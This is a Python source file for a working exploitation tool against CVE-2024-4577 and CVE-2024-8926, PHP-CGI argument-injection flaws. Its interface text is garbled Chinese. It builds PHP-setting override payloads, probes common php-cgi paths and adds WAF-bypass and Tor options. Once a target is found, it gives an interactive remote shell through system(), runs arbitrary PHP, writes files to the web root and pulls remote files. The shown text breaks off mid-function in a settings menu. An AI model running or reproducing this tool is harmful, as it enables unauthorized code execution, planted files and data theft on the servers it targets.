import argparse
import requests
import sys
import urllib3
import chardet
import os
import base64
import re
import time
from urllib.parse import urlparse
import textwrap

from rich import print as rprint
from rich.panel import Panel
from rich.console import Console
from rich.text import Text
from rich.markdown import Markdown
from rich.syntax import Syntax
from rich.table import Table
import banner
from bypass_manager import apply_bypass
import tor_helper

console = Console()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Payload åƒæ•¸åº«
PAYLOAD_ELEMENTS = {
    1: "disable_functions%3d%26",
    2: "disable_classes%3d%26",
    3: "open_basedir%3d",
    4: "cgi.force_redirect%3d0",
    5: "cgi.redirect_status_env",
    6: "allow_url_include%3d1",
    7: "allow_url_fopen%3d1",
    8: "auto_prepend_file%3dphp://input",
    9: "file_uploads%3d1",
    10: "upload_max_filesize%3d0",
    11: "log_errors%3d0",
    12: "post_max_size%3d0",
    13: "memory_limit%3d%2B1",
    14: "enable_dl%3d1",
    15: "max_execution_time%3d0",
    16: "short_open_tag%3d1",
    17: "max_input_time%3d0",
    18: "expose_php%3d1"
}

# é è¨­ Payload çµ„åˆåº«
PAYLOAD_COMBINATIONS = {
    "1": [1, 2, 3, 4, 5, 6, 7, 8],
    "2": [1, 4, 5, 6, 8],
    "3": [4, 6, 8],
}

# é€£æ¥ç¬¦
CVE_PREFIXES = {
    "CVE-2024-4577": "%ADd",
    "CVE-2024-8926": "%a8-d%a8"
}

# å¸¸è¦‹ CGI è·¯å¾‘å­—å…¸
CGI_POINTS = [
    "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
    "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
    "/cgi-bin/php.exe", "/cgi/php.exe",
    "/index.php", "/"
]

# å…¨åŸŸè®Šæ•¸åˆå§‹è¨­å®š
enable_log = False
VERBOSE_MODE = False
use_tor = False
tor_session = None
timeout_value = 10
active_request_template = None
selected_payload_group = "1"
PAYLOAD_GROUPS = {}
forced_cgipoint = None
delay_between_requests = 0

# Parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="CVE-2024-4577 & CVE-2024-8926 Exploitation Tool")
    parser.add_argument("-u", "--url", required=True, help="ç›®æ¨™ç¶²å€")
    parser.add_argument("--timeout", type=int, default=10, help="é è¨­ç‚º10ï¼Œè‹¥é ˆé€¾æ™‚ç§’æ•¸ï¼Œ0 ç‚ºç„¡é™ç­‰å¾…ï¼Œå»ºè­° 1~30ï¼Œæœ€å¤§ 120")
    parser.add_argument("--log", action="store_true", help="å•Ÿç”¨shell log æ¨¡å¼")
    parser.add_argument("--verbose", action="store_true", help="é¡¯ç¤ºè©³ç´°è«‹æ±‚è³‡è¨Šï¼Œæ›´å¥½çš„é€²è¡Œåˆ¤æ–·")
    parser.add_argument("--payload", nargs="?", const="SELECT", help="é¸æ“‡ Payload ç·¨è™Ÿï¼Œé è¨­ç‚º1ï¼Œè‹¥æœªæŒ‡å®šå€¼å‰‡é€²å…¥é¸å–®é¸æ“‡ï¼Œè¼¸å…¥ C å‰‡é€²å…¥è‡ªè¨‚æ¨¡å¼")
    parser.add_argument("--cgipoint", nargs="+", help="æŒ‡å®šä¸€çµ„æˆ–å¤šçµ„ CGI è·¯å¾‘ï¼Œä¾‹å¦‚ --cgipoint \"/a.php\",\"/b.php\"")
    parser.add_argument("--tor", action="store_true", help="å•Ÿç”¨ Tor æ¨¡å¼")
    parser.add_argument("--bypass", action="store_true", help="å•Ÿç”¨ WAF ç¹éæ¸¬è©¦")
    parser.add_argument("--force", action="store_true", help="å¼·åˆ¶é€²å…¥æ¼æ´åˆ©ç”¨æ¨¡å¼ï¼Œå³ä½¿æœªåµæ¸¬åˆ°æ¼æ´")
    parser.add_argument("--delay", type=float, default=0, help="æ¯æ¬¡è«‹æ±‚å¾Œå»¶é²ç§’æ•¸ï¼ˆé è¨­ 0ï¼Œå¯è¨­ 0.5 ~ 5ï¼‰")
    parser.add_argument("--no-effects", action="store_true", help="é—œé–‰æ‰€æœ‰å‹•ç•«èˆ‡å»¶é²æ•ˆæœï¼ŒåŠ å¿«è…³æœ¬åŸ·è¡Œ")

    return parser.parse_args()

# çµ„åˆ Payload
def generate_payload_groups():
    global PAYLOAD_GROUPS
    PAYLOAD_GROUPS = {
        group_id: {
            cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in elements])
            for cve, prefix in CVE_PREFIXES.items()
        }
        for group_id, elements in PAYLOAD_COMBINATIONS.items()
    }
    return PAYLOAD_GROUPS

PAYLOAD_GROUPS = generate_payload_groups()
selected_payload_group = "1"
PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]

# Payloadé¸æ“‡
def get_selected_payload_group(args):
    global selected_payload_group, PAYLOADS
    if "--payload" not in args:
        selected_payload_group = "1"
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    payload_index = args.index("--payload") + 1
    if payload_index >= len(args):
        rprint("[bold red][!] æ²’æœ‰æŒ‡å®š Payloadï¼Œè«‹æ‰‹å‹•é¸æ“‡ï¼[/bold red]")
        return show_payload_list()

    user_choice = args[payload_index]
    if user_choice in PAYLOAD_GROUPS:
        selected_payload_group = user_choice
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    rprint("[bold yellow][!] ç„¡æ•ˆçš„ Payloadï¼Œè«‹æ‰‹å‹•é¸æ“‡ï¼[/bold yellow]")
    return show_payload_list()

# é¡¯ç¤ºå¯ç”¨ `Payload`ï¼Œè®“ä½¿ç”¨è€…æ‰‹å‹•é¸æ“‡
def show_payload_list():
    global selected_payload_group
    rprint("[bold cyan][*] å¯ç”¨çš„ Payload çµ„åˆï¼š[/bold cyan]")
    sleep_safe(0.1)
    
    rprint("[dim]â”€" * 50)    
    for idx in sorted(PAYLOAD_COMBINATIONS.keys(), key=int):
        rprint(f"[bold cyan]{idx}) æ‰€åŒ…å« Payload å…ƒç´ å¦‚ä¸‹ï¼š[/bold cyan]")

        printed = set()
        for element_key in PAYLOAD_COMBINATIONS[idx]:
            if element_key not in PAYLOAD_ELEMENTS:
                continue
            content = PAYLOAD_ELEMENTS[element_key].strip()
            if not content or content in printed:
                continue
            printed.add(content)

            text = Text("â€¢ ", style="green")
            text.append(content, style="white")
            if "php://input" in content:
                start = content.find("php://input")
                end = start + len("php://input")
                text.stylize("bold red", 2 + start, 2 + end)
            console.print(text)
            sleep_safe(0.04)

        rprint("[dim]â”€" * 50)
        sleep_safe(0.02)

    while True:
        rprint("[bold cyan][?][/bold cyan] è«‹è¼¸å…¥å°æ‡‰çš„ç·¨è™Ÿä¾†åˆ‡æ› Payload çµ„æˆ–ä½¿ç”¨ C è‡ªè¨‚ Payload : ", end="")
        user_choice = input().strip()
        if user_choice in PAYLOAD_COMBINATIONS:
            selected_payload_group = user_choice
            print()
            break
        elif user_choice.upper() == "C":
            rprint("\n[bold blue][*] é€²å…¥è‡ªè¨‚ Payload æ¨¡å¼...[/bold blue]")
            selected_payload_group = customize_payload()
            break
        else:
            rprint("[bold yellow][!] ç„¡æ•ˆè¼¸å…¥ï¼Œè«‹è¼¸å…¥æ­£ç¢ºçš„æ•¸å­—æˆ– `C` ä¾†è‡ªè¨‚ Payloadï¼[/bold yellow]\n")

    return selected_payload_group, PAYLOAD_COMBINATIONS[selected_payload_group]

# è‡ªè¨‚ Payload
def customize_payload():
    global PAYLOAD_COMBINATIONS, PAYLOAD_GROUPS, PAYLOADS, selected_payload_group

    rprint("\n[bold cyan][*] ç›®å‰å¯ç”¨çš„ Payload å…ƒç´ ï¼š[/bold cyan]")
    rprint("[dim]â”€" * 50)
    sleep_safe(0.1)
    max_key_len = max(len(str(k)) for k in PAYLOAD_ELEMENTS)
    for key in sorted(PAYLOAD_ELEMENTS.keys(), key=int):
        content = PAYLOAD_ELEMENTS[key]
        key_str = f"{key:0{max_key_len}d}"
        text = Text(f"[{key_str}] ", style="bold green")
        text.append(content, style="white")
        if "php://input" in content:
            start = content.find("php://input")
            end = start + len("php://input")
            text.stylize("bold red", len(f"[{key_str}] ") + start, len(f"[{key_str}] ") + end)
        console.print(text)
        sleep_safe(0.02)
        print()
        sleep_safe(0.02)

    rprint("[dim]â”€" * 50)

    while True:
        rprint("[bold cyan][?][/bold cyan] è«‹è¼¸å…¥è¦çµ„åˆçš„å…ƒç´ ç·¨è™Ÿï¼ˆç”¨ç©ºæ ¼åˆ†éš”ï¼Œä¾‹å¦‚ï¼š1 3 5 7ï¼‰ï¼š", end="")
        user_input = input().strip()
        selected_elements = user_input.split()

        if all(e.isdigit() and int(e) in PAYLOAD_ELEMENTS for e in selected_elements):
            selected_elements = [int(e) for e in selected_elements]
            break
        else:
            rprint("[bold red][!] ç„¡æ•ˆè¼¸å…¥ï¼Œè«‹è¼¸å…¥å¯ç”¨çš„ç·¨è™Ÿï¼Œç”¨ç©ºæ ¼åˆ†éš”ï¼[/bold red]\n")

    new_id = str(len(PAYLOAD_COMBINATIONS) + 1)
    PAYLOAD_COMBINATIONS[new_id] = selected_elements
    PAYLOAD_GROUPS[new_id] = {
        cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in selected_elements])
        for cve, prefix in CVE_PREFIXES.items()
    }

    rprint("\n[bold green][+] å·²æˆåŠŸæ–°å¢è‡ªè¨‚ Payloadï¼[/bold green]")
    sleep_safe(0.05)
    
    text_4577 = Text("[*] CVE-2024-4577 Payload:\n    ", style="cyan")
    payload_4577 = PAYLOAD_GROUPS[new_id]['CVE-2024-4577']
    text_4577.append(payload_4577, style="white")
    if "php://input" in payload_4577:
        start = payload_4577.find("php://input")
        end = start + len("php://input")
        text_4577.stylize("bold red", 4 + start, 4 + end)  # 4 is indent offset
    console.print(text_4577)
    sleep_safe(0.05)
    
    text_8926 = Text("[*] CVE-2024-8926 Payload:\n    ", style="cyan")
    payload_8926 = PAYLOAD_GROUPS[new_id]['CVE-2024-8926']
    text_8926.append(payload_8926, style="white")
    if "php://input" in payload_8926:
        start = payload_8926.find("php://input")
        end = start + len("php://input")
        text_8926.stylize("bold red", 4 + start, 4 + end)  # 4 is indent offset
    console.print(text_8926)
    sleep_safe(0.05)
    
    print()
    selected_payload_group = new_id
    PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
    
    return new_id
    
def interactive_bypass_setup():
    try:
        from bypass_manager import load_all_tampers
    except ImportError:
        rprint("[bold red][!] éŒ¯èª¤ï¼šæœªæ‰¾åˆ° `bypass_manager` æ¨¡çµ„ï¼Œè«‹ç¢ºèªæ­¤æ¨¡çµ„æ˜¯å¦å­˜åœ¨ã€‚[/bold red]")
        return [], 0

    all_tampers = load_all_tampers()
    rprint("\n[bold cyan][*][/bold cyan] å¯ç”¨ç¹éæ–¹æ¡ˆï¼š")
    rprint("[dim]â”€" * 50)
    for idx, (name, desc) in enumerate(all_tampers.items(), 1):
        rprint(f"[bold cyan]{idx})[/bold cyan] [bold white]{name}[/bold white] ï¼š")
        rprint(f"[grey70]{desc}[/grey70]\n")
        time.sleep(0.07)
    rprint("[dim]â”€" * 50)

    rprint("[bold cyan][?][/bold cyan] è«‹è¼¸å…¥è¦å•Ÿç”¨çš„æ–¹æ¡ˆç·¨è™Ÿï¼ˆå¯å¤šé¸ï¼Œä¾‹å¦‚ï¼š1 3 4ï¼‰: ", end="")
    chosen = input().strip().split()
    selected = []
    for c in chosen:
        if c.isdigit() and 1 <= int(c) <= len(all_tampers):
            selected.append(list(all_tampers.keys())[int(c) - 1])

    if len(selected) > 1:
        rprint("[bold yellow][!][/bold yellow] [yellow]æé†’ï¼šå¤šå€‹ç¹éæ–¹æ¡ˆå°‡åŒæ™‚å¥—ç”¨ï¼[/yellow]")

    rprint("[bold cyan][?][/bold cyan] è«‹è¼¸å…¥é‡è©¦æ¬¡æ•¸ï¼ˆå»ºè­° 1-10ï¼‰: ", end="")
    retries = input().strip()
    retries = int(retries) if retries.isdigit() and int(retries) > 0 else 1
    print()
    return selected, retries


def run_bypass_mode(target, bypass_modules, retry_count, custom_cgi_list=None):

    cgi_list = custom_cgi_list if custom_cgi_list else CGI_POINTS

    for payload_key in PAYLOADS:
        for i in range(retry_count):
            for ep in cgi_list:
                req = {
                    "url": target,
                    "cgipoint": ep,
                    "payload": PAYLOADS[payload_key],
                    "headers": {},
                    "post_data": "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>",
                    "cve_id": payload_key
                }

                req = apply_bypass(req, bypass_modules, attempt=i)

                target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
                resp = send_request(
                    target_url,
                    req["post_data"],
                    timeout=timeout_value,
                    headers=req.get("headers", {})
                )

                if resp and "TEST_VULNTEST_CVE-2024-4577" in resp:
                    rprint(f"[bold green][+] æ‰¾åˆ° CGI æ³¨å…¥é»ï¼š[/bold green] [cyan]{req['cgipoint']}[/cyan] (æ¼æ´: [magenta]{payload_key}[/magenta])\n")
                    return req["cgipoint"], payload_key

    rprint("[bold red][-] æ‰€æœ‰ç­–ç•¥çµ„åˆå˜—è©¦å¤±æ•—[/bold red]")
    return None, None

# è‡ªå‹•è½‰æ›ç·¨ç¢¼
def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    return response.content.decode(encoding, errors='replace') if encoding else response.content.decode('utf-8', errors='replace')

# ç™¼é€è«‹æ±‚
def send_request(url, data, timeout=None, headers=None, use_template=False):
    if headers is None:
        headers = {}
    try:
        global active_request_template
        if use_template and active_request_template:
            url = f"{url}{active_request_template['cgipoint']}?{active_request_template['payload']}"
            headers = active_request_template.get("headers", {})

        if VERBOSE_MODE:
            rprint("\n[bold cyan]======================================= ç™¼é€è«‹æ±‚ =======================================[/bold cyan]")
            table = Table(show_header=False, box=None, padding=(0,1))
            wrapped_url = textwrap.fill(url, width=65)
            table.add_row("[cyan]URL[/cyan]", Text(wrapped_url, style="white"))
            table.add_row("[cyan]Data[/cyan]", str(data))
            table.add_row("[cyan]Timeout[/cyan]", str(timeout))
            if headers:
                wrapped_headers = textwrap.fill(str(headers), width=65)
                table.add_row("[cyan]Headers[/cyan]", Text(wrapped_headers, style="white"))
            console.print(table)
            rprint("[bold cyan]========================================================================================[/bold cyan]\n")

        if isinstance(data, str):
            data = data.encode("utf-8")

        if use_tor:
            response = tor_session.post(url, data=data, headers=headers, timeout=timeout)
        else:
            response = requests.post(url, data=data, headers=headers, verify=False, timeout=timeout)
            
        if VERBOSE_MODE:
            rprint("[bold cyan]======================================= å›æ‡‰è³‡è¨Š =======================================[/bold cyan]")
            table = Table(show_header=False, box=None, padding=(0,1))
            status_code = response.status_code
            if 200 <= status_code < 300:
                status_color = "green"
            elif 300 <= status_code < 400:
                status_color = "bright_cyan"
            elif status_code == 401:
                status_color = "khaki1"
            elif 400 <= status_code < 500:
                status_color = "blue"
            elif 500 <= status_code < 600:
                status_color = "red"
            else:
                status_color = "magenta"
            table.add_row(f"[cyan]Status[/cyan]", f"[{status_color}]{status_code}[/{status_color}]")
            table.add_row("[cyan]Preview[/cyan]", response.text[:500])
            console.print(table)
            rprint("[bold cyan]========================================================================================[/bold cyan]\n")
        # delay æ¨¡å¼       
        if delay_between_requests > 0:
            sleep_safe(delay_between_requests)
    
        return decode_response(response)
    except Exception as e:
        if VERBOSE_MODE:
            rprint("[bold red]========================================================================================[/bold red]\n")
            rprint(f"[bold red][!] è«‹æ±‚éŒ¯èª¤: {e}[/bold red]")
            rprint("[bold red]========================================================================================[/bold red]\n")
        else:
            rprint(f"[bold red][!] è«‹æ±‚éŒ¯èª¤: {e}[/bold red]")

        return None

# æšèˆ‰æ³¨å…¥é»
def choose_cgipoint(url, payload_key, custom_cgi_list=None):
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"

    if VERBOSE_MODE:
        rprint(f"[bold violet]============================= æ¸¬è©¦ Payload : {payload_key} =============================[/bold violet]")
        table = Table(show_header=False, box=None, padding=(0, 1))
        wrapped_payload = textwrap.fill(PAYLOADS[payload_key], width=65)
        payload_text = Text(wrapped_payload, style="white")
        table.add_row("[violet]Key[/violet]", Text(str(payload_key), style="white"))
        table.add_row("[violet]Payload[/violet]", payload_text)
        console.print(table)
        rprint("[bold violet]========================================================================================[/bold violet]\n")

    cgi_list = custom_cgi_list if custom_cgi_list else CGI_POINTS

    for ep in cgi_list:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout=timeout_value)

        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            rprint(f"[bold green][+] æ‰¾åˆ° CGI æ³¨å…¥é»:[/bold green] [cyan]{ep}[/cyan] (æ¼æ´: [magenta]{payload_key}[/magenta])\n")
            return ep

    if VERBOSE_MODE:
        rprint("[bold yellow]========================================================================================[/bold yellow]")
        rprint(f"[yellow][-] æœªæ‰¾åˆ°æ¼æ´ {payload_key}[/yellow]")
        rprint("[bold yellow]========================================================================================[/bold yellow]\n")
    else:
        rprint(f"[yellow][-] æœªæ‰¾åˆ°æ¼æ´ {payload_key}[/yellow]")

    return None

    # è‡ªå‹•æƒæé‚è¼¯
    for ep in CGI_POINTS:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout=timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            if VERBOSE_MODE:
                rprint("[bold green]========================================================================================[/bold green]")
                rprint(f"[bold green][+] æ‰¾åˆ°CGIæ³¨å…¥é»:[bold green] [cyan]{ep}[/cyan] (æ¼æ´: [magenta]{payload_key}[/magenta])")
                rprint("[bold green]========================================================================================[/bold green]\n")
            else:
                rprint(f"[bold green][+] æ‰¾åˆ°CGIæ³¨å…¥é»:[bold green] [cyan]{ep}[/cyan] (æ¼æ´: [magenta]{payload_key}[/magenta])\n")
            return ep

    if VERBOSE_MODE:
        rprint("[bold yellow]========================================================================================[/bold yellow]")
        rprint(f"[yellow][-] æœªæ‰¾åˆ°æ¼æ´ {payload_key}[/yellow]")
        rprint("[bold yellow]========================================================================================[/bold yellow]\n")
    else:    
        rprint(f"[yellow][-] æœªæ‰¾åˆ°æ¼æ´ {payload_key}[/yellow]")

    return None
    
# ç§»é™¤ä¸èƒ½ç”¨æ–¼æª”åçš„å­—å…ƒ
def sanitize_filename(filename):
    return re.sub(r'[\/:*?"<>|]', '_', filename)

# ä»¥æ”»æ“Šç›®æ¨™çš„ host ç‚ºåŸºç¤å»ºç«‹æª”æ¡ˆåç¨±
def get_unique_filepath(directory, host):
    base_filename = sanitize_filename(host)
    candidate = os.path.join(directory, f"{base_filename}.txt")
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base_filename}_{i}.txt")
        i += 1
    return candidate

# å–å¾—ç›®æ¨™ç¶²ç«™çš„æ ¹ç›®éŒ„
def get_remote_docroot(url, cgipoint, payload_key, bypass_modules):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    req = {
        "url": url,
        "cgipoint": cgipoint,
        "payload": PAYLOADS[payload_key],
        "headers": {},
        "post_data": payload,
        "cve_id": payload_key
    }

    req = apply_bypass(req, bypass_modules, attempt=0)
    target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
    resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    return resp.strip() if resp else None

# äº¤äº’å¼shell
def exploit_shell(url, cgipoint, payload_key, bypass_modules):
    rprint("[cyan][*] è¼¸å…¥å‘½ä»¤ï¼Œè¼¸å…¥ exit çµæŸï¼Œå¯ä½¿ç”¨ --save å„²å­˜å–®æ¬¡è¼¸å‡ºï¼š[/cyan]")
    host = urlparse(url).netloc
    log_dir = os.path.join(os.getcwd(), "log")
    if enable_log:
        rprint("[cyan][*] logæ¨¡å¼å·²å•Ÿå‹•[/cyan]")
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
    print()
    log_path = os.path.join(log_dir, f"{host}.log") if enable_log else None

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            rprint("[green][+] å·²é€€å‡ºäº¤äº’å¼ shell æ¨¡å¼\n[/green]")
            break

        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = get_unique_filepath(save_dir, host)

        php_code = f"<?php system('{real_cmd}'); die(); ?>"
        if active_request_template:
            resp = send_request(url, php_code, timeout=timeout_value, use_template=True)
        else:
            req = {
                "url": url,
                "cgipoint": cgipoint,
                "payload": PAYLOADS[payload_key],
                "headers": {},
                "post_data": php_code,
                "cve_id": payload_key
            }
            req = apply_bypass(req, bypass_modules, attempt=0)
            full_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
            resp = send_request(full_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

        output = resp.strip() if resp else ""
        print(output)

        if save_path:
            save_path = os.path.abspath(save_path)
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            rprint(f"[green][+] è¼¸å‡ºçµæœå·²å„²å­˜è‡³ {save_path}[/green]")
        print()
        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")

# è‡ªè¨‚php
def custom_php_mode(url, cgipoint, payload_key, bypass_modules):
    rprint("[cyan][*] è¼¸å…¥PHPç¨‹å¼ç¢¼ï¼Œè¼¸å…¥ EOF çµæŸï¼Œå¯ä½¿ç”¨ --save å„²å­˜è¼¸å‡ºï¼š[/cyan]")

    php_code = ""
    save_path = None
    host = urlparse(url).netloc

    while True:
        line = input()
        if line.strip().startswith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = get_unique_filepath(save_dir, host)
            break
        php_code += line + "\n"

    payload = f"<?php {php_code}\ndie(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        req = {
            "url": url,
            "cgipoint": cgipoint,
            "payload": PAYLOADS[payload_key],
            "headers": {},
            "post_data": payload,
            "cve_id": payload_key
        }
        req = apply_bypass(req, bypass_modules, attempt=0)
        target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
        resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    output = resp.strip() if resp else ""
    rprint("[dim]â”€" * 150)
    print(output)

    if save_path:
        save_path = os.path.abspath(save_path)
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        rprint(f"[green][+] PHPè¼¸å‡ºçµæœå·²å„²å­˜è‡³ {save_path}[/green]")
    rprint("[dim]â”€" * 150)

# ä¸Šå‚³æª”æ¡ˆ
def upload_file(url, cgipoint, payload_key, bypass_modules):
    local = input("æœ¬åœ°æª”æ¡ˆè·¯å¾‘ï¼š").strip()
    remote = input("ç›®æ¨™å®Œæ•´è·¯å¾‘ï¼ˆè‹¥ç•™ç©ºå°‡ä¸Šå‚³è‡³ç¶²ç«™æ ¹ç›®éŒ„ï¼‰ï¼š").strip()
    print()
    if remote == "":
        docroot = get_remote_docroot(url, cgipoint, payload_key, bypass_modules)
        if docroot:
            remote = os.path.join(docroot, os.path.basename(local)).replace("\\", "/")
            rprint(f"[green][*] å·²è‡ªå‹•è¨­å®šä¸Šå‚³è·¯å¾‘ç‚º: {remote}[/green]")
        else:
            rprint("[red][!] ç„¡æ³•å–å¾—ç¶²ç«™æ ¹ç›®éŒ„ï¼Œè«‹æ‰‹å‹•æŒ‡å®šå®Œæ•´è·¯å¾‘[/red]")
            return

    try:
        with open(local, "r", encoding="utf-8", errors="ignore") as f:
            raw_content = f.read()
    except Exception as e:
        rprint(f"[red][!] è®€å–æœ¬åœ°æª”æ¡ˆå¤±æ•—: {e}[/red]")
        return

    payload = f"<?php file_put_contents('{remote}', '{raw_content}'); echo 'OK'; die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        req = {
            "url": url,
            "cgipoint": cgipoint,
            "payload": PAYLOADS[payload_key],
            "headers": {},
            "post_data": payload,
            "cve_id": payload_key
        }
        req = apply_bypass(req, bypass_modules, attempt=0)
        target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
        resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    if resp and "OK" in resp:
        rprint(f"[green][+] æˆåŠŸä¸Šå‚³è‡³ {remote}[/green]")
    else:
        rprint("[red][!] ä¸Šå‚³å¤±æ•—ï¼Œç„¡å›æ‡‰[/red]")
    print()

# ä¸‹è¼‰æª”æ¡ˆ
def download_file(url, cgipoint, payload_key, bypass_modules):
    remote = input("[?] é ç«¯æª”æ¡ˆè·¯å¾‘ï¼š").strip()
    if not remote:
        rprint("[bold red][!] æœªè¼¸å…¥æª”æ¡ˆè·¯å¾‘ï¼Œå–æ¶ˆä¸‹è¼‰ã€‚[/bold red]\n")
        return

    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")

    payload = f"<?php echo file_get_contents('{remote}'); die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        req = {
            "url": url,
            "cgipoint": cgipoint,
            "payload": PAYLOADS[payload_key],
            "headers": {},
            "post_data": payload,
            "cve_id": payload_key
        }
        req = apply_bypass(req, bypass_modules, attempt=0)
        target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
        resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    if not resp or resp.strip() == "":
        rprint(f"[bold red][!] æª”æ¡ˆä¸å­˜åœ¨æˆ–ä¼ºæœå™¨ç„¡å›æ‡‰ï¼š{remote}[/bold red]\n")
        return

    with open(local, "wb") as f:
        f.write(resp.encode("utf-8"))
    rprint(f"[bold green][+] å·²ä¸‹è¼‰è‡³ {local}[/bold green]\n")

#å‹•ç•«æ¨¡å¼
def sleep_safe(sec):
    global disable_effects
    if not disable_effects and sec > 0:
        time.sleep(sec)

# Exploit æ¨¡å¼åƒæ•¸åˆ‡æ›é¸å–®
def exploit_settings_menu(state):
    while True:
        print()
        sleep_safe(0.07)
        rprint("[bold cyan][âš™ï¸ åˆ©ç”¨éšæ®µåƒæ•¸è¨­å®šé¸å–®][/bold cyan]\n")
        sleep_safe(0.07)

        payload_display = "è‡ªè¨‚" if state["selected_payload_group"] not in PAYLOAD_COMBINATIONS else state["selected_payload_group"]
        bypass_info = f"{', '.join(state['bypass_modules_selected'])}" if state['bypass_modules_selected'] else "æœªé¸æ“‡"

        menu_lines = [
            f"[cyan]1)[/cyan] åˆ‡æ›è·è¼‰ Payload        [bold cyan]{payload_display}[/bold cyan]",
            f"[cyan]2)[/cyan] ç¹éæ¨¡çµ„ Bypass         {'[bold cyan]' + bypass_info + '[/bold cyan]' if bypass_info else '[dim]æœªé¸æ“‡[/dim]'}",
            f"[cyan]3)[/cyan] ç­‰å¾…æ™‚é–“ Timeout        [bold]{state['timeout_value']} ç§’[/bold]",
            f"[cyan]4)[/cyan] è«‹æ±‚å»¶é² Delay          [bold]{state['delay_between_requests']} ç§’[/bold]",
            f"[cyan]5)[/cyan] è‡ªå‹•ç´€éŒ„ Log            {'[bold bold]é–‹å•Ÿ[/bold bold]' if state['enable_log'] else '[dim]é—œé–‰[/dim]'}",
            f"[cyan]6)[/cyan] è©³ç´°æ¨¡å¼ Verbose        {'[bold bold]é–‹å•Ÿ[/bold bold]' if state['VERBOSE_MODE'] else '[dim]é—œé–‰[/dim]'}",
            f"[cyan]7)[/cyan] å‹•ç•«æ•ˆæœ Effects        {'[bold bold]é–‹å•Ÿ[/bold bold]' if not state['disable_effects'] else '[dim]é—œé–‰[/dim]'}",
            f"[cyan]8)[/cyan] å¼·åˆ¶åˆ©ç”¨ Force          {'[bold bold]é–‹å•Ÿ[/bold bold]' if state['force_mode'] else '[dim]é—œé–‰[/dim]'}",
            f"[cyan]9)[/cyan] å„²å­˜ä¸¦è¿”å› Exploit é¸å–®"
        ]

        for line in menu_lines:
            rprint(line)
            sleep_safe(0.07)

        choice = input(">> ").strip()
        print()

        if choice == "1":
            state["selected_payload_group"], _ = show_payload_list()
            state["PAYLOADS"] = PAYLOAD_GROUPS.get(state["selected_payload_group"], PAYLOAD_GROUPS["1"])
            rprint("[bold green][*] Payload çµ„åˆå·²æ›´æ–°ï¼[/bold green]")

        elif choice == "2":
            modules, _ = interactive_bypass_setup()
            state["bypass_modules_selected"] = modules
            rprint("[bold green][*] ç¹éæ¨¡çµ„è¨­å®šå·²æ›´æ–°ï¼[/bold green]")

        elif choice == "3":
            try:
                new_timeout = int(input("[?] è«‹è¼¸å…¥æ–°çš„ timeout ç§’æ•¸ï¼ˆ0~120ï¼Œ0 è¡¨ç¤ºç„¡é™ç­‰å¾…ï¼‰ï¼š").strip())
                if new_timeout < 0 or new_timeout > 120:
                    raise ValueError
                state["timeout_value"] = new_timeout
                rprint("[bold green][*] Timeout å·²æ›´æ–°ï¼[/bold green]")
            except:
                rprint("[bold red][!] è¼¸å…¥éŒ¯èª¤ï¼Œtimeout å¿…é ˆæ˜¯ 0~120 çš„æ•´æ•¸[/bold red]")

        elif choice == "4":
            try:
                new_delay = float(input("[?] è«‹è¼¸å…¥æ–°çš„ delay ç§’æ•¸ï¼ˆ0~10ï¼‰ï¼š").strip())
                if new_delay < 0 or new_delay > 10:
                    raise ValueError
                state["delay_between_requests"] = new_delay
                rprint("[bold green][*] Delay å·²æ›´æ–°ï¼[/bold green]")
            except:
